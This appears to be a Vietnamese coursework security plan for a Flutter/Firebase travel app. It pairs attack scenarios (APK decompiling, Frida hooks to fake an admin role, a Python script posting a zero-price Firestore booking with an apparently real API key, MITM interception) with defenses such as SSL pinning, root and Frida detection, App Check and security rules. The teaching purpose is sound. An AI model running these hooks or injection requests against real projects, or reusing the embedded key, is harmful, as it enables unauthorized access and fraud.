# KẾ HOẠCH BẢO MẬT ỨNG DỤNG - TRAVEL APP
**Môn: Application Security - KMA**

---

## 📋 PHÂN TÍCH HIỆN TRẠNG APP

### Công nghệ sử dụng
- **Framework**: Flutter (Dart)
- **Backend**: Firebase (Auth, Firestore, Storage)
- **Authentication**: Google Sign-In
- **Payment**: VietQR API
- **Maps**: Google Maps
- **Package Name**: `com.example.lnmq`

### Dữ liệu nhạy cảm trong app
- ✅ Firebase API Keys (hard-coded trong `firebase_options.dart` và `google-services.json`)
- ✅ User data: Email, Display Name, Phone, Booking history
- ✅ Payment info: Booking details, QR payment links
- ✅ Admin/User role authorization
- ✅ Firebase project credentials

---

## 🎯 KỊCh BẢN TẤN CÔNG (Attack Scenarios)

### 1️⃣ REVERSE ENGINEERING APK
**Mục tiêu**: Lấy source code, API keys, logic nghiệp vụ

#### Kịch bản tấn công:
```bash
# Bước 1: Tải APK từ device/store
adb pull /data/app/com.example.lnmq/base.apk

# Bước 2: Decompile APK
apktool d base.apk -o decompiled/

# Bước 3: Extract Firebase config
# File: decompiled/res/values/strings.xml
# Tìm: google_api_key, firebase_database_url, project_id

# Bước 4: Reverse Dart code
# Flutter compile thành bytecode nhưng vẫn extract được assets
unzip base.apk
# Xem: assets/flutter_assets/
```

**Rủi ro**:
- ❌ Lộ Firebase API Key → Attacker có thể abuse Firebase services
- ❌ Lộ package name, app structure
- ❌ Hiểu được flow xác thực, authorization
- ❌ Tìm hardcoded secrets (nếu có)

---

### 2️⃣ FRIDA/XPOSED HOOKING
**Mục tiêu**: Hook runtime để bypass authentication, modify logic

#### Kịch bản tấn công:
```javascript
// Frida Script - Hook Firebase Auth check
Java.perform(function() {
    // Hook isAdmin check
    var FirebaseFirestore = Java.use('io.flutter.plugins.firebase.firestore.FlutterFirebaseFirestorePlugin');
    
    // Hook method để force return isAdmin = true
    FirebaseFirestore.getDocument.implementation = function(call, result) {
        console.log('[*] Hooked getDocument');
        // Modify response để set role = 'admin'
        var fakeData = {'role': 'admin', 'isAdmin': true};
        result.success(fakeData);
    };
});
```

#### Hook trong Flutter:
```javascript
// Hook SharedPreferences hoặc local storage
// Frida attach vào libflutter.so
Interceptor.attach(Module.findExportByName("libflutter.so", "Dart_StringToUTF8"), {
    onEnter: function(args) {
        console.log('[*] String access:', Memory.readUtf8String(args[0]));
    }
});
```

**Rủi ro**:
- ❌ Bypass role check → User thường trở thành Admin
- ❌ Modify booking price → Book tour giá 0đ
- ❌ Bypass payment verification
- ❌ Inject fake data vào Firestore queries

---

### 3️⃣ BYPASS LOGIN / FAKE AUTHENTICATION
**Mục tiêu**: Vào app không cần đăng nhập hợp lệ

#### Kịch bản tấn công:
```dart
// Code hiện tại (main.dart):
StreamBuilder<User?>(
  stream: FirebaseAuth.instance.authStateChanges(),
  builder: (context, snapshot) {
    if (snapshot.hasData) {
      // Redirect to HomeScreen or AdminHomeScreen
    }
  }
)

// Attack: Sử dụng Frida để fake snapshot.hasData = true
```

**Cách thực hiện**:
1. Root device
2. Chạy Frida server
3. Hook `authStateChanges()` để return fake User object
4. Hoặc modify SharedPreferences nếu app cache auth token

**Rủi ro**:
- ❌ Truy cập app không cần Google account
- ❌ Fake user identity
- ❌ Access unauthorized features

---

### 4️⃣ FAKE API / FIRESTORE MANIPULATION
**Mục tiêu**: Gửi fake request đến Firestore hoặc Firebase APIs

#### Kịch bản tấn công:
```python
# Sử dụng Firebase API key bị lộ
import requests

API_KEY = "AIzaSyCMQPbz47CVgzz9POO886TS4Z7PlvVqCW0"
PROJECT_ID = "lnmqne"

# Fake data injection
url = f"https://firestore.googleapis.com/v1/projects/{PROJECT_ID}/databases/(default)/documents/bookings"
headers = {"Authorization": f"Bearer {API_KEY}"}

fake_booking = {
    "fields": {
        "userId": {"stringValue": "attacker_id"},
        "tourName": {"stringValue": "Free Tour Hack"},
        "totalPrice": {"integerValue": 0},
        "status": {"stringValue": "confirmed"}
    }
}

requests.post(url, json=fake_booking, headers=headers)
```

**Rủi ro**:
- ❌ Tạo booking giả với giá 0đ
- ❌ Modify user role thành admin
- ❌ Delete data của user khác
- ❌ Spam database

---

### 5️⃣ MAN-IN-THE-MIDDLE (MITM)
**Mục tiêu**: Intercept traffic giữa app và Firebase/APIs

#### Kịch bản tấn công:
```bash
# Bước 1: Setup proxy (Burp Suite/mitmproxy)
mitmproxy -p 8080

# Bước 2: Install CA cert trên device
adb push mitmproxy-ca-cert.cer /sdcard/

# Bước 3: Set proxy trong device
# Settings > WiFi > Proxy: Manual (192.168.x.x:8080)

# Bước 4: Nếu app KHÔNG có SSL Pinning
# → Xem được tất cả traffic Firebase, Google APIs
```

**Captured data**:
```json
POST https://firestore.googleapis.com/v1/projects/lnmqne/...
{
  "writes": [{
    "update": {
      "name": "projects/lnmqne/databases/(default)/documents/users/UID123",
      "fields": {
        "role": {"stringValue": "admin"}
      }
    }
  }]
}
```

**Rủi ro**:
- ❌ Đọc/modify mọi request/response
- ❌ Steal Firebase tokens
- ❌ Replay attacks
- ❌ Inject malicious data

---

## 🛡️ PHƯƠNG ÁN PHÒNG THỦ (Defense Strategies)

### 1️⃣ CODE OBFUSCATION
**Mục đích**: Làm khó reverse engineering

#### Triển khai:
```bash
# Flutter build với obfuscation
flutter build apk --obfuscate --split-debug-info=build/debug-info/
```

**Cấu hình build.gradle.kts**:
```kotlin
buildTypes {
    release {
        isMinifyEnabled = true
        isShrinkResources = true
        proguardFiles(
            getDefaultProguardFile("proguard-android-optimize.txt"),
            "proguard-rules.pro"
        )
        signingConfig = signingConfigs.getByName("release")
    }
}
```

**ProGuard rules** (`proguard-rules.pro`):
```proguard
-keepattributes *Annotation*
-dontwarn okhttp3.**
-keep class io.flutter.** { *; }
-keep class com.google.firebase.** { *; }
# Obfuscate tất cả code ngoại trừ Flutter/Firebase
-repackageclasses 'o'
-allowaccessmodification
```

**Hiệu quả**:
- ✅ Class/method names bị mã hóa: `MainActivity` → `a.b.c`
- ✅ Khó đọc logic nghiệp vụ
- ⚠️ Không ngăn được hoàn toàn, chỉ làm chậm attacker

---

### 2️⃣ ROOT/JAILBREAK DETECTION
**Mục đích**: Ngăn app chạy trên device đã root

#### Triển khai:
```yaml
# pubspec.yaml
dependencies:
  flutter_jailbreak_detection: ^1.10.0
  safe_device: ^1.1.4
```

```dart
// lib/utils/security_check.dart
import 'package:flutter_jailbreak_detection/flutter_jailbreak_detection.dart';
import 'package:safe_device/safe_device.dart';

class SecurityCheck {
  static Future<bool> isDeviceSecure() async {
    final isJailBroken = await FlutterJailbreakDetection.jailbroken;
    final isDevelopmentMode = await FlutterJailbreakDetection.developerMode;
    final isRealDevice = await SafeDevice.isRealDevice;
    final isSafeDevice = await SafeDevice.isSafeDevice;
    
    if (isJailBroken || isDevelopmentMode || !isRealDevice || !isSafeDevice) {
      return false;
    }
    return true;
  }
  
  static Future<void> performSecurityCheck() async {
    final isSecure = await isDeviceSecure();
    if (!isSecure) {
      // Show warning dialog and exit app
      throw SecurityException('Device is not secure. App cannot run on rooted/jailbroken devices.');
    }
  }
}
```

**Tích hợp vào main.dart**:
```dart
void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  
  // Security check trước khi init Firebase
  await SecurityCheck.performSecurityCheck();
  
  await Firebase.initializeApp(
    options: DefaultFirebaseOptions.currentPlatform,
  );
  runApp(const MyApp());
}
```

**Hiệu quả**:
- ✅ Ngăn Frida/Xposed trên device đã root
- ✅ Phát hiện emulator
- ⚠️ Có thể bypass bằng cách hook detection functions

---

### 3️⃣ ANTI-DEBUG & TAMPER DETECTION
**Mục đích**: Phát hiện khi app bị debug hoặc modify

#### Triển khai native (Android):
```kotlin
// android/app/src/main/kotlin/.../MainActivity.kt
package com.example.lnmq

import io.flutter.embedding.android.FlutterActivity
import android.os.Debug

class MainActivity: FlutterActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Anti-debug check
        if (Debug.isDebuggerConnected() || Debug.waitingForDebugger()) {
            android.os.Process.killProcess(android.os.Process.myPid())
        }
        
        // Signature verification
        if (!verifySignature()) {
            android.os.Process.killProcess(android.os.Process.myPid())
        }
    }
    
    private fun verifySignature(): Boolean {
        try {
            val packageInfo = packageManager.getPackageInfo(
                packageName, 
                android.content.pm.PackageManager.GET_SIGNATURES
            )
            val signature = packageInfo.signatures[0]
            // Compare với signature gốc (hash của signing key)
            val expectedSignature = "YOUR_RELEASE_SIGNATURE_HASH"
            return signature.hashCode().toString() == expectedSignature
        } catch (e: Exception) {
            return false
        }
    }
}
```

**Integrity check Flutter**:
```dart
// lib/utils/integrity_check.dart
import 'package:crypto/crypto.dart';
import 'dart:io';

class IntegrityCheck {
  // Checksum của các file quan trọng
  static const Map<String, String> fileChecksums = {
    'lib/main.dart': 'expected_hash_here',
    'lib/services/auth_service.dart': 'expected_hash_here',
  };
  
  static Future<bool> verifyIntegrity() async {
    // Trong production, check native library hashes
    // Hoặc verify APK signature từ native code
    return true;
  }
}
```

**Hiệu quả**:
- ✅ Phát hiện debugging realtime
- ✅ Ngăn repackaging APK
- ✅ Detect modified code
- ⚠️ Advanced attacker có thể bypass

---

### 4️⃣ SSL PINNING
**Mục đích**: Ngăn MITM attacks

#### Triển khai:
```yaml
# pubspec.yaml
dependencies:
  http_certificate_pinning: ^2.0.3
```

```dart
// lib/services/secure_http_client.dart
import 'package:http_certificate_pinning/http_certificate_pinning.dart';

class SecureHttpClient {
  static Future<void> checkCertificate() async {
    // Pin Google APIs (Firebase sử dụng)
    List<String> allowedFingerprints = [
      // Firebase/Google certificate SHA-256
      "A0:31:C4:67:82:E6:E6:C6:62:C2:C3:F2:09:A3:E8:7C:E3:A6:07:B5:A4:26:C0:0C:57:18:6C:EE:B9:44:4A:B9",
    ];
    
    try {
      await HttpCertificatePinning.check(
        serverURL: "https://firestore.googleapis.com",
        headerHttp: {},
        sha: SHA.SHA256,
        allowedSHAFingerprints: allowedFingerprints,
        timeout: 50,
      );
    } catch (e) {
      throw Exception('SSL Pinning failed: Possible MITM attack!');
    }
  }
}
```

**Alternative: Sử dụng dio + certificate pinning**:
```dart
// lib/services/pinned_http.dart
import 'package:dio/dio.dart';
import 'package:dio/io.dart';
import 'dart:io';

class PinnedHttpClient {
  static Dio createDio() {
    final dio = Dio();
    
    (dio.httpClientAdapter as IOHttpClientAdapter).createHttpClient = () {
      final client = HttpClient();
      client.badCertificateCallback = (cert, host, port) {
        // Verify certificate fingerprint
        final certSHA256 = cert.sha256.toString();
        const expectedSHA256 = 'YOUR_CERT_FINGERPRINT';
        return certSHA256 == expectedSHA256;
      };
      return client;
    };
    
    return dio;
  }
}
```

**Hiệu quả**:
- ✅ Ngăn Burp Suite, mitmproxy intercept traffic
- ✅ Bảo vệ dữ liệu truyền tải
- ⚠️ Phải update fingerprint khi cert thay đổi

---

### 5️⃣ SECURE API KEY STORAGE
**Mục đích**: Không hard-code API keys trong code

#### Giải pháp:

**A. Sử dụng Environment Variables (Build time)**:
```dart
// lib/config/app_config.dart
class AppConfig {
  static const String firebaseApiKey = String.fromEnvironment(
    'FIREBASE_API_KEY',
    defaultValue: '',
  );
}

// Build với env variable
// flutter build apk --dart-define=FIREBASE_API_KEY=your_key_here
```

**B. Sử dụng Native Storage**:
```yaml
# pubspec.yaml
dependencies:
  flutter_secure_storage: ^9.0.0
```

```dart
// lib/services/secure_storage.dart
import 'package:flutter_secure_storage/flutter_secure_storage.dart';

class SecureStorage {
  static const _storage = FlutterSecureStorage();
  
  // Lưu API key vào KeyChain (iOS) / KeyStore (Android)
  static Future<void> saveApiKey(String key) async {
    await _storage.write(key: 'firebase_api_key', value: key);
  }
  
  static Future<String?> getApiKey() async {
    return await _storage.read(key: 'firebase_api_key');
  }
}
```

**C. Firebase App Check** (Recommended):
```yaml
# pubspec.yaml
dependencies:
  firebase_app_check: ^0.2.1+8
```

```dart
// lib/main.dart
import 'package:firebase_app_check/firebase_app_check.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  
  await Firebase.initializeApp(
    options: DefaultFirebaseOptions.currentPlatform,
  );
  
  // App Check - Verify requests từ legitimate app
  await FirebaseAppCheck.instance.activate(
    androidProvider: AndroidProvider.playIntegrity, // Hoặc debug
  );
  
  runApp(const MyApp());
}
```

**Firestore Security Rules** (quan trọng!):
```javascript
// firestore.rules
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {
    // Chỉ cho phép authenticated users
    match /users/{userId} {
      allow read, write: if request.auth != null && request.auth.uid == userId;
    }
    
    // Bookings - user chỉ xem được của mình
    match /bookings/{bookingId} {
      allow create: if request.auth != null;
      allow read: if request.auth != null && 
        (resource.data.userId == request.auth.uid || 
         get(/databases/$(database)/documents/users/$(request.auth.uid)).data.role == 'admin');
      allow update: if get(/databases/$(database)/documents/users/$(request.auth.uid)).data.role == 'admin';
    }
    
    // Admin-only collections
    match /places/{placeId} {
      allow read: if true; // Public read
      allow write: if request.auth != null && 
        get(/databases/$(database)/documents/users/$(request.auth.uid)).data.role == 'admin';
    }
  }
}
```

**Hiệu quả**:
- ✅ API key không lộ trong APK
- ✅ App Check ngăn fake API requests
- ✅ Firestore rules ngăn unauthorized access
- ✅ Secure storage dùng hardware encryption

---

### 6️⃣ ANTI-TAMPER & RUNTIME PROTECTION
**Mục đích**: Phát hiện và ngăn modification runtime

```dart
// lib/utils/runtime_protection.dart
import 'dart:async';
import 'dart:io';

class RuntimeProtection {
  static Timer? _checker;
  
  static void startProtection() {
    // Check every 5 seconds
    _checker = Timer.periodic(Duration(seconds: 5), (timer) async {
      await _checkIntegrity();
    });
  }
  
  static Future<void> _checkIntegrity() async {
    // 1. Check if Frida is running
    if (await _isFridaRunning()) {
      _exitApp('Frida detected');
    }
    
    // 2. Check debugger
    if (await _isDebuggerAttached()) {
      _exitApp('Debugger detected');
    }
    
    // 3. Check suspicious apps
    if (await _hasSuspiciousApps()) {
      _exitApp('Suspicious apps detected');
    }
  }
  
  static Future<bool> _isFridaRunning() async {
    try {
      // Check for Frida server port
      final socket = await Socket.connect('127.0.0.1', 27042, timeout: Duration(seconds: 1));
      socket.destroy();
      return true;
    } catch (e) {
      return false;
    }
  }
  
  static Future<bool> _isDebuggerAttached() async {
    // Native check qua platform channel
    return false;
  }
  
  static Future<bool> _hasSuspiciousApps() async {
    // Check installed apps: Lucky Patcher, Xposed, etc.
    return false;
  }
  
  static void _exitApp(String reason) {
    print('Security violation: $reason');
    exit(0);
  }
  
  static void stopProtection() {
    _checker?.cancel();
  }
}
```

---

## 📊 PRIORITY ROADMAP

### 🔴 CRITICAL (Phải làm ngay)
1. **Firebase Security Rules** - Ngăn unauthorized access
2. **Firebase App Check** - Verify legitimate requests
3. **Remove hardcoded secrets** - Move API keys ra khỏi code
4. **SSL Pinning** - Ngăn MITM

### 🟠 HIGH (Nên làm)
5. **Root Detection** - Ngăn hook/tamper
6. **Code Obfuscation** - Build với --obfuscate
7. **Anti-Debug** - Native implementation

### 🟡 MEDIUM (Tốt nếu có)
8. **Runtime Protection** - Monitor Frida/Xposed
9. **Tamper Detection** - Verify APK signature
10. **Secure Storage** - Dùng flutter_secure_storage

---

## 🧪 KỊCH BẢN DEMO/TEST (Cho môn học)

### Demo 1: Reverse APK & Extract Secrets
```bash
# Build APK
flutter build apk

# Decompile
apktool d build/app/outputs/flutter-apk/app-release.apk

# Tìm secrets
grep -r "AIzaSy" decompiled/
cat decompiled/res/values/strings.xml
```

### Demo 2: MITM Attack (Without SSL Pinning)
```bash
# Setup mitmproxy
mitmproxy -p 8080

# Install cert
adb push ~/.mitmproxy/mitmproxy-ca-cert.cer /sdcard/
# Device Settings > Security > Install cert

# Capture Firebase traffic
# Xem được: Auth tokens, Firestore queries, User data
```

### Demo 3: Frida Hook (Bypass Admin Check)
```javascript
// hook.js
Java.perform(function() {
    console.log('[*] Hooking started');
    
    // Hook để fake isAdmin = true
    // (Chi tiết code tùy implementation)
});

// Run
frida -U -f com.example.lnmq -l hook.js
```

### Demo 4: Implement SSL Pinning & Test
```dart
// Implement pinning
await SecureHttpClient.checkCertificate();

// Test với mitmproxy → App sẽ crash/reject connection
// Kết quả: "SSL Pinning failed: Possible MITM attack!"
```

### Demo 5: Root Detection
```dart
// Run trên device thường → OK
// Run trên device đã root → App exit

final isSecure = await SecurityCheck.isDeviceSecure();
print('Device secure: $isSecure'); // false nếu rooted
```

---

## 📝 CHECKLIST TRIỂN KHAI

### Phase 1: Security Foundation
- [ ] Setup Firebase Security Rules cho users, bookings, places
- [ ] Enable Firebase App Check
- [ ] Move API keys ra environment variables
- [ ] Implement secure storage cho sensitive data

### Phase 2: Code Protection
- [ ] Enable ProGuard/R8 obfuscation
- [ ] Build với `--obfuscate --split-debug-info`
- [ ] Add anti-tamper checks trong native code

### Phase 3: Runtime Protection
- [ ] Implement root/jailbreak detection
- [ ] Add SSL pinning cho Firebase/Google APIs
- [ ] Implement anti-debug checks

### Phase 4: Testing
- [ ] Test reverse engineering với apktool
- [ ] Test MITM với mitmproxy (before/after pinning)
- [ ] Test Frida hooking (before/after protection)
- [ ] Test trên rooted device

---

## 🎓 KẾT LUẬN

### Điểm yếu hiện tại:
1. ❌ API keys hard-coded (dễ bị lộ)
2. ❌ Không có SSL pinning (dễ bị MITM)
3. ❌ Không check root/debug (dễ bị hook)
4. ❌ Không có code obfuscation (dễ reverse)
5. ❌ Firestore rules chưa đủ strict

### Sau khi implement:
1. ✅ API keys được bảo vệ (App Check + Security Rules)
2. ✅ SSL pinning ngăn MITM
3. ✅ Root detection ngăn Frida/Xposed
4. ✅ Code obfuscation làm khó reverse
5. ✅ Firestore rules ngăn unauthorized access

### Học được gì:
- **Attack mindset**: Hiểu cách attacker tấn công mobile app
- **Defense in depth**: Nhiều layer bảo mật, không rely vào 1 technique
- **Trade-off**: Security vs UX (root detection có thể block user hợp lệ)
- **Real-world security**: Firebase, SSL, code protection

---

## 📚 TÀI LIỆU THAM KHẢO

1. OWASP Mobile Security Testing Guide: https://owasp.org/www-project-mobile-security-testing-guide/
2. Flutter Security Best Practices: https://docs.flutter.dev/security
3. Firebase Security Rules: https://firebase.google.com/docs/rules
4. Frida Documentation: https://frida.re/docs/
5. APKTool: https://ibotpeaches.github.io/Apktool/

---

**Lưu ý**: Đây là kịch bản học tập. Trong thực tế production cần thêm nhiều layer security như: Backend validation, Rate limiting, Monitoring/Logging, Incident response plan.
